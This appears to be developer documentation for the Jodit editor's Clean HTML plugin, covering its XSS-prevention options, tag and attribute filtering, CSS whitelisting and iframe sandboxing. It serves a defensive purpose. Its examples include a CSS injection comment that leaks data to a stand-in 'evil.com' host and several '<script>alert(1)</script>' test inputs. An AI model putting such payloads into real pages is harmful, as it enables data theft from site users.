# Clean HTML Plugin

Automatically cleans and sanitizes HTML content to prevent XSS attacks and unwanted markup. Provides tag/attribute filtering, format removal, and HTML normalization.

For a comprehensive security guide including CSP, Trusted Types, and server-side sanitization, see [Security Guide](https://xdsoft.net/jodit/docs/security.html).

## Description

This plugin continuously monitors and cleans HTML content in the editor. It removes dangerous scripts, normalizes markup, and enforces tag/attribute restrictions. Also adds an "Eraser" button for removing formatting from selected text.

## Features

- **XSS Protection**: Removes dangerous scripts and ALL event handler attributes (`on*`)
- **Tag Filtering**: Allow/deny specific HTML tags
- **Attribute Control**: Control which attributes are permitted
- **CSS Property Filtering**: Whitelist allowed CSS properties in `style` attributes
- **Link Safety**: Auto-add `rel="noopener noreferrer"` to `target="_blank"` links
- **Iframe Sandboxing**: Automatically sandbox `<iframe>` elements in content
- **Unsafe Embed Conversion**: Convert `<object>`/`<embed>` to sandboxed `<iframe>`
- **External Sanitizer Hook**: Integrate DOMPurify or other sanitizers
- **Format Removal**: "Eraser" button to clear formatting
- **Auto-cleaning**: Cleans HTML on change, paste, and mode switch
- **Tag Normalization**: Replace old tags (`<i>` → `<em>`, `<b>` → `<strong>`)
- **Empty Element Removal**: Removes unnecessary empty tags
- **Sandbox Mode**: Optional iframe sandbox for extra security during HTML parsing

## Configuration Options

### `cleanHTML.timeout`
- **Type**: `number`
- **Default**: `300`
- **Description**: Delay (ms) before applying cleaning after changes

```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    timeout: 500 // Clean after 500ms of inactivity
  }
});
```

### `cleanHTML.replaceNBSP`
- **Type**: `boolean`
- **Default**: `true`
- **Description**: Replace `&nbsp;` with regular spaces

```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    replaceNBSP: false // Keep non-breaking spaces
  }
});
```

### `cleanHTML.fillEmptyParagraph`
- **Type**: `boolean`
- **Default**: `true`
- **Description**: Remove empty `<p>` tags (except at start)

### `cleanHTML.removeEmptyElements`
- **Type**: `boolean`
- **Default**: `true`
- **Description**: Remove all empty elements

### `cleanHTML.replaceOldTags`
- **Type**: `IDictionary<HTMLTagNames> | false`
- **Default**: `{ i: 'em', b: 'strong' }`
- **Description**: Replace deprecated tags with modern equivalents

```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    replaceOldTags: {
      i: 'em',
      b: 'strong',
      strike: 's'
    }
  }
});
```

### `cleanHTML.useIframeSandbox`
- **Type**: `boolean`
- **Default**: `false`
- **Description**: Use iframe sandbox for safer HTML testing (slower)

```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    useIframeSandbox: true // Extra security, reduced performance
  }
});
```

### `cleanHTML.removeEventAttributes`
- **Type**: `boolean`
- **Default**: `true`
- **Description**: Remove ALL `on*` event handler attributes (`onerror`, `onclick`, `onload`, `onmouseover`, `onfocus`, etc.)

> **Migration note (v4.11.0):** This replaces the old `removeOnError` option which only removed `onerror`. The new option removes **all** event handler attributes for comprehensive XSS protection.

```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    removeEventAttributes: true // Remove onclick, onload, onerror, etc.
  }
});
```

### `cleanHTML.removeOnError` (deprecated)
- **Type**: `boolean`
- **Default**: `true`
- **Description**: Remove `onerror` attributes from tags. Deprecated — use `removeEventAttributes` instead.

### `cleanHTML.safeJavaScriptLink`
- **Type**: `boolean`
- **Default**: `true`
- **Description**: Sanitize `javascript:` URLs in `href` attributes

### `cleanHTML.safeLinksTarget`
- **Type**: `boolean`
- **Default**: `true`
- **Description**: Automatically add `rel="noopener noreferrer"` to links with `target="_blank"` to prevent `window.opener` attacks

```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    safeLinksTarget: true
  }
});

// Input:  <a href="https://example.com" target="_blank">link</a>
// Output: <a href="https://example.com" target="_blank" rel="noopener noreferrer">link</a>
```

### `cleanHTML.allowedStyles`
- **Type**: `false | IDictionary<string[]>`
- **Default**: `false`
- **Description**: Whitelist of allowed CSS properties inside `style` attributes. If set, all CSS properties not in the list will be removed. Supports global (`*`) and tag-specific rules.

```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    allowedStyles: {
      '*': ['color', 'background-color', 'font-size', 'text-align', 'font-weight'],
      img: ['width', 'height']
    }
  }
});

// Blocks CSS injection like:
// style="background-image: url('https://evil.com/leak?data=secret')"
```

### `cleanHTML.sanitizer`
- **Type**: `false | ((value: string) => string)`
- **Default**: `false`
- **Description**: Custom sanitizer function called before Jodit's built-in sanitization. Use to integrate DOMPurify or other external sanitizers.

```javascript
import DOMPurify from 'dompurify';

const editor = Jodit.make('#editor', {
  cleanHTML: {
    sanitizer: (html) => DOMPurify.sanitize(html)
  }
});
```

### `cleanHTML.sandboxIframesInContent`
- **Type**: `boolean`
- **Default**: `true`
- **Description**: Automatically add `sandbox=""` attribute to all `<iframe>` elements in editor content. Prevents embedded content from running scripts or accessing the parent page.

```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    sandboxIframesInContent: true
  }
});
```

### `cleanHTML.convertUnsafeEmbeds`
- **Type**: `false | string[]`
- **Default**: `['object', 'embed']`
- **Description**: Convert specified elements to sandboxed `<iframe>`. Set `false` to disable, or pass a custom list of tag names.

```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    // Default: convert <object> and <embed>
    convertUnsafeEmbeds: ['object', 'embed']
  }
});

// Input:  <embed src="video.swf" width="400" height="300">
// Output: <iframe src="video.swf" sandbox="" width="400" height="300" frameborder="0"></iframe>
```

```javascript
// Extend with additional tags
Jodit.make('#editor', {
  cleanHTML: {
    convertUnsafeEmbeds: Jodit.atom(['object', 'embed', 'applet'])
  }
});
```

### `cleanHTML.allowTags`
- **Type**: `false | string | IDictionary<string>`
- **Default**: `false`
- **Description**: Explicitly allowed tags and attributes

For instance, you can explicitly define which tags or attributes are allowed or disallowed:

```javascript
Jodit.make('#editor', {
	cleanHTML: {
		allowTags: {
			p: true,
			a: {
				href: true
			},
			table: true,
			tbody: true,
			tr: true,
			td: true,
			th: false,
			img: {
				src: '1.png'
			}
		}
	}
});
```

You can also disable specific tags. For example, let's disable script tags and images:

```javascript
Jodit.make('#editor', {
	cleanHTML: {
		denyTags: 'script,img'
	}
});
```

Alternatively, you can use an object to specify the denied tags:

```javascript
Jodit.make('#editor', {
	cleanHTML: {
		denyTags: {
			script: true,
			img: true
		}
	}
});
```

The plugin settings can be accessed under the namespace [[Config.cleanHTML]].

**String format:**
```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    allowTags: 'p,a[href],table,tr,td,img[src=1.png]'
    // Allow only <p>, <a>, <table>, <tr>, <td>, <img>
    // For <a>: only href attribute
    // For <img>: only src="1.png"
  }
});
```

### `cleanHTML.denyTags`
- **Type**: `false | string | IDictionary<string>`
- **Default**: `'script,iframe,object,embed'`
- **Description**: Explicitly denied tags

> **Migration note (v4.11.0):** Default changed from `'script'` to `'script,iframe,object,embed'`. If you need iframes in your content, explicitly override this:
> ```javascript
> cleanHTML: { denyTags: 'script' }
> ```

**String format:**
```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    denyTags: 'script,img'
  }
});
```

**Object format:**
```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    denyTags: {
      script: true,
      img: true
    }
  }
});
```

### `cleanHTML.disableCleanFilter`
- **Type**: `Nullable<Set<string>>`
- **Default**: `null`
- **Description**: Disable specific cleaning filters

Available filter names: `tryRemoveNode`, `allowAttributes`, `sanitizeAttributes`, `replaceOldTags`, `fillEmptyParagraph`, `removeEmptyTextNode`, `removeInvTextNodes`, `safeLinksTarget`, `sanitizeStyles`, `sandboxIframesInContent`, `convertUnsafeEmbeds`.

## Usage Examples

### Basic XSS Protection (defaults)

Out of the box, Jodit provides strong XSS protection:

```javascript
const editor = Jodit.make('#editor');
// Default protections:
// - Blocks <script>, <iframe>, <object>, <embed> tags
// - Removes ALL on* event handlers (onclick, onerror, onload, etc.)
// - Neutralizes javascript: URIs
// - Adds rel="noopener noreferrer" to target="_blank" links
// - Sandboxes iframes in content
// - Converts <object>/<embed> to sandboxed <iframe>
```

### Strict Whitelisting

```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    allowTags: {
      p: true,
      strong: true,
      em: true,
      a: {
        href: true,
        target: '_blank' // Only allow target="_blank"
      }
    }
  }
});

editor.value = '<p>Hello <strong>world</strong> <script>alert(1)</script></p>';
console.log(editor.value); // <p>Hello <strong>world</strong> </p>
```

### CSS Property Whitelisting

```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    allowedStyles: {
      '*': ['color', 'background-color', 'font-size', 'text-align'],
      img: ['width', 'height']
    }
  }
});
```

### DOMPurify Integration

```javascript
import DOMPurify from 'dompurify';

const editor = Jodit.make('#editor', {
  cleanHTML: {
    sanitizer: (html) => DOMPurify.sanitize(html)
  }
});
```

### Priority: allowTags vs denyTags

**Important**: `allowTags` takes priority over `denyTags`. If `allowTags` is set, all tags not in the whitelist are removed.

```javascript
const editor = Jodit.make('#editor', {
  cleanHTML: {
    allowTags: {
      script: true,
    },
    denyTags: {
      script: true, // This is ignored!
    }
  }
});

editor.value = '<script>alert(1)</script><p>test</p>';
console.log(editor.value); // <script>alert(1)</script>
// Only script tag is allowed, <p> is removed
```

## Button

- **Name**: `eraser`
- **Group**: `font-style`
- **Command**: `removeFormat`
- **Tooltip**: "Clear Formatting"

## Notes

- Plugin runs continuously with lazy evaluation (`LazyWalker`)
- Cleaning is throttled by `timeout` option
- Uses visitor pattern for extensible filtering rules
- Filters can be found in `helpers/visitor/filters/`
- Essential for security in user-generated content scenarios
- See [Security Guide](https://xdsoft.net/jodit/docs/security.html) for comprehensive security documentation
